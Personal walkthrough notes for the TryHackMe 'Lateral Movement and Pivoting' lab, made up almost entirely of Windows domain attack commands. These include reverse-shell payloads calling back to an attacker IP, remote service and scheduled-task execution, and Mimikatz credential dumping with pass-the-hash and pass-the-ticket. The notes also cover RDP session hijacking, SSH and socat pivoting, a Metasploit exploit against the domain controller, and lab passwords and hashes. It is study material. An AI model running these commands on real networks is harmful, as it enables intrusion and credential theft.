+++
title = "Lateral Movement and Pivoting"
+++

# https://tryhackme.com/room/lateralmovementandpivoting

Extra reading: https://adepts.of0x.cc/shadowmove-hijack-socket/

```bash
=================================
TARGET_IP_ADDRESS -- domain.com -- win/lin x32/x64
=================================
vpn-connect

echo 'export THMDCIP=10.200.74.101' >> ~/.zshrc && source ~/.zshrc
cat /etc/resolv.conf
echo "nameserver $THMDCIP" | sudo tee /etc/resolv.conf
nslookup thmdc.za.tryhackme.com 

# Get AD creds
http://distributor.za.tryhackme.com/creds 
// Username: damien.horton
// Password: pABqHYKsG8L7

# SSH
nslookup thmjmp2.za.tryhackme.com
autossh -M 0 -o "ServerAliveInterval 15" -o "ServerAliveCountMax 3" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 za\\damien.horton@thmjmp2.za.tryhackme.com
// pABqHYKsG8L7

---

### Psexec TCP/445 (SMB) in Administrators group
# - Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
# - Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
# - Create some named pipes to handle stdin/stdout/stderr.

C:\tools\psexec64.exe \\<TARGET> -u <USER> -p <PASS> -i cmd.exe

### WinRM TCP/5985 (HTTP) / TCP/5986 (HTTPS) in Remote Management Users group

winrs.exe -u:<USER> -p:<PASS> -r:target cmd
# or via PowerShell
$username = '<USER>';
$password = '<PASS>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# Interactive
Enter-PSSession -Computername <TARGET> -Credential $credential
# Non-Interactive
Invoke-Command -Computername <TARGET> -Credential $credential -ScriptBlock {whoami}

### Service Creation via sc.exe in Administrators group
# - TCP/135, TCP/49152-65535 (DCE/RPC)
# - TCP/139 (RPC over SMB Named Pipes)
# - TCP/445 (RPC over SMB Named Pipes)

# msfvenom payloads need to use "-f exe-service" to continue running
sc.exe \\<TARGET> create <SERVICE_NAME> binPath= "net user <USER> <PASS> /add" start= auto
sc.exe \\<TARGET> start <SERVICE_NAME>
sc.exe \\<TARGET> stop <SERVICE_NAME>
sc.exe \\<TARGET> delete <SERVICE_NAME>

# Or scheduled task
schtasks /s <TARGET> /RU "SYSTEM" /create /sc ONCE /sd 01/01/1970 /st 00:00 /tn "<TASK_NAME>" /tr "<COMMAND>"
schtasks /s <TARGET> /run /TN "<TASK_NAME>" 
schtasks /S <TARGET> /TN "<TASK_NAME>" /DELETE /F

---

msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<ATTACKER_IP> LPORT=<PORT> -o <FILENAME>
smbclient -c 'put <FILE>' -W <DOMAIN> -U <USER> '//<TARGET>/admin$/' <PASS>
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <PORT>;exploit"

runas /netonly /user:<DOMAIN>\<USER> "c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <PORT>"
# Note: /netonly, the system wont validate the creds so avoid "ACCESS DENIED" errors and type password correctly

---

Username: ZA.TRYHACKME.COM\t1_leonard.summers
Password: EZpass4ever

# Create and upload msf payload
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.150.74.10 LPORT=54321 -o bananagram.exe
smbclient -c 'put bananagram.exe' -W ZA -U t1_leonard.summers '//thmiis/admin$/' EZpass4ever
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.150.74.10; set LPORT 54321;exploit"

# Get interactive on target
evil-winrm -i thmiis.za.tryhackme.com -u t1_leonard.summers -p 'EZpass4ever'
ls C:\windows\bananagram.exe
// exists!

sc.exe \\thmiis.za.tryhackme.com create "BananaGram Updater™" binPath="C:\windows\bananagram.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start "BananaGram Updater™"
sc.exe \\thmiis.za.tryhackme.com stop "BananaGram Updater™"
sc.exe \\thmiis.za.tryhackme.com delete "BananaGram Updater™"
sc.exe \\thmiis.za.tryhackme.com query "BananaGram Updater™"

C:\Users\t1_leonard.summers\Desktop\Flag.exe

---

### WMI Protocols:
# - DCOM: RPC uses port 135/TCP and ports 49152-65535/TCP
# - Wsman: WinRM uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

# or via PowerShell
$username = '<USER>';
$password = '<PASS>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -Credential $credential -SessionOption $Opt -ErrorAction Stop -ComputerName <TARGET>
// $Session will be reused below

# Remote Commands
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value Hellooooooooooo";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}

# Remote Services
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "<SERVICE_NAME>";
DisplayName = "<DISPLAY_NAME>";
PathName = "<COMMAND>"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '<SERVICE_NAME>'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete

# Scheduled Tasks
$Command = "cmd.exe"
$Args = "/c <COMMAND>"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<TASK_NAME>"
Start-ScheduledTask -CimSession $Session -TaskName "<TASK_NAME>"
Unregister-ScheduledTask -CimSession $Session -TaskName "<TASK_NAME>"

# Install MSI Packages
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<MSI_PACKAGE>"; Options = ""; AllUsers = $false}
]

---

# Username: ZA.TRYHACKME.COM\t1_corine.waters
# Password: Korine.1994

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.150.74.10 LPORT=4445 -f msi > mango.msi
smbclient -c 'put mango.msi' -W ZA -U t1_corine.waters '//thmiis.za.tryhackme.com/admin$/' Korine.1994
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.150.74.10; set LPORT 4445;exploit"

powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\mango.msi"; Options = ""; AllUsers = $false}

evil-winrm -i thmiis.za.tryhackme.com -u t1_corine.waters -p 'Korine.1994'

// msi didnt work so switched to exe

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.150.74.10 LPORT=4445 -f exe > mango.exe
set payload windows/x64/meterpreter/reverse_tcp

---
### Alternative Auths

# Pass the Hash (PtH) via mimikatz
# Note: this is for NTLM
privilege::debug
token::elevate

# Hashes from local SAM
lsadump::sam

# Hashes from LSASS memory
sekurlsa::msv

# Revert original token privs
token::revert

# Run commands
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"<COMMAND>"

# Various tools/protocols using PtH
xfreerdp /v:<TARGET> /u:<DOMAIN>\\<USER> /pth:<NTLM_HASH>
impacket-psexec -hashes <NTLM_HASH> <DOMAIN>/<USER>@<TARGET>
evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>

### Pass the Ticket (PtT) via mimikatz
privilege::debug
sekurlsa::tickets /export

# Inject ticket into user's session (even outside of mimikatz shell)
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
// ^ NOTE: this is a file from /export

# List current cached Kerberos tickets
klist

### Overpass the Hash / Pass the Key (PtK) via mimikatz

# Get Kerberos Keys
privilege::debug
sekurlsa::ekeys
// depending on the key type...

# AES128
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes128:<HASH> /run:"<COMMAND>"
# AES256
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes258:<HASH> /run:"<COMMAND>"
# RC4
# Note: The Overpass-the-Hash (OPtH) attack works by using a user's NTLM hash directly as the RC4 Kerberos key to request a Ticket-Granting Ticket (TGT). This is possible if RC4 is an enabled Kerberos encryption protocol.
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /rc4:<HASH> /run:"<COMMAND>"

---

Username: ZA.TRYHACKME.COM\t2_felicia.dean
Password: iLov3THM!

autossh -M 0 -o "ServerAliveInterval 15" -o "ServerAliveCountMax 3" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
// iLov3THM!

cd C:\tools
.\mimikatz.exe

# PtH
privilege::debug
token::elevate
sekurlsa::msv
// * Username : t1_toby.beck
// * NTLM     : 533f1bd576caa912bdb9da284bbc60fe

token::revert

nc -lvnp 443
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe 10.150.74.10 443"
// nc calls back as felicia but...

winrs.exe -r:thmiis.za.tryhackme.com cmd.exe
// this will get us to THMIIS as toby

//---

sekurlsa::tickets /export
dir *toby*
kerberos::ptt [0;51a86d]-2-0-40e10000-t1_toby.beck5@krbtgt-ZA.TRYHACKME.COM.kirbi
exit  # leave mimikatz

klist
// Client: t1_toby.beck5
.\PsExec64.exe \\THMIIS.ZA.TRYHACKME.COM cmd.exe
// impersonating the wrong Toby

---
### Hijacking Sessions

C:\tools\PsExec64.exe -accepteula -nobanner -s cmd.exe
query user
tscon 3 /dest:rdp-tcp#<SESSION>

# Username: t2_george.kay
# Password: Jght9206
xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:thmjmp2.za.tryhackme.com /u:t2_george.kay /p:'Jght9206' /drive:'/usr/share/windows-resources/mimikatz/x64',share
// didnt work?

xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:thmjmp2.za.tryhackme.com /u:t2_jack.osborne /p:'Lolo1983' /drive:'/usr/share/windows-resources/mimikatz/x64',share

---
### Tunneling

# For callbacks, create a user and password without console access
sudo useradd tunneluser -m -d /home/tunneluser -s /bin/true
sudo bash -c 'echo TuNn3Ll1Ng1SfUn | passwd --stdin tunneluser'
// must use -N (no command) for tunneluser

# SSH: Jumpbox => ATTACKER_IP
# Forward Tun: ATTACKER_IP => TARGET:PORT
# uses -R because this listens on the attacker box (technically forward listening port from attacker box perspective) 
ssh tunneluser@<ATTACKER_IP> -R 127.0.0.1:<LPORT>:<TARGET>:<RPORT> -N
# Reverse Tun: Target/Jumpbox => ATTACKER_IP
ssh tunneluser@<ATTACKER_IP> -L *:<RPORT>:127.0.0.1:<LPORT> -N

# consider FW rules as needed
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80

---
### RDP to THMIIS
# Socat: ATTACKER => THMJMP2 => THMIIS
# RDP: THMPJMP2:<SOCAT_PORT>

nslookup THMIIS.za.tryhackme.com
// Name:    THMIIS.za.tryhackme.com
// Address:  10.200.74.201
C:\tools\socat\socat.exe TCP4-LISTEN:63389,fork TCP4:10.200.74.201:3389
C:\tools\nc64.exe -zvv 10.200.74.201 3389
// (UNKNOWN) [10.200.74.201] 3389 (ms-wbt-server) open

nslookup THMJMP2.za.tryhackme.com
// Name:    THMJMP2.za.tryhackme.com
// Address:  10.200.74.249

xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:10.200.74.249:63389 /u:'ZA.tryhackme.com\t1_thomas.moore' /p:MyPazzw3rd2020 /drive:'/usr/share/windows-resources/mimikatz/x64',share
// run: flag.bat

---
### Exploit THMDC
# SSH:		THMJMP2 => ATTACKER
# Exploit:	ATTACKER => THMJMP2 => THMDC
# CB Web:	THMDC => THMJMP2 => ATTACKER
# CB Shell:	THMDC => THMJMP2 => ATTACKER
// Note: ATTACKER_IP = ip add show lateralmovement
// 10.150.74.10

# in order as above
# Bent LPORT:	8888
# CB Web:	51180
# CB Shell:	51337
ssh tunneluser@10.150.74.10 -N -R 8888:thmdc.za.tryhackme.com:80 -L *:51180:127.0.0.1:51180 -L *:51337:127.0.0.1:51337

use rejetto_hfs_exec
# d/t tunnels, all listeners are localhost
set ReverseListenerBindAddress 127.0.0.1
# Bent Tun: 127.0.0.1:8888 => THMDC:80
set rhosts 127.0.0.1
set rport 8888
# CB Web: THMJMP2:51180 => ATTACKER:51180
set srvhost 127.0.0.1
set srvport 51180
# CB Shell: THMJMP2:51337 => ATTACKER:51337
set payload windows/shell_reverse_tcp
set lhost thmjmp2.za.tryhackme.com
set lport 51337

run
// success!

type flag.txt
```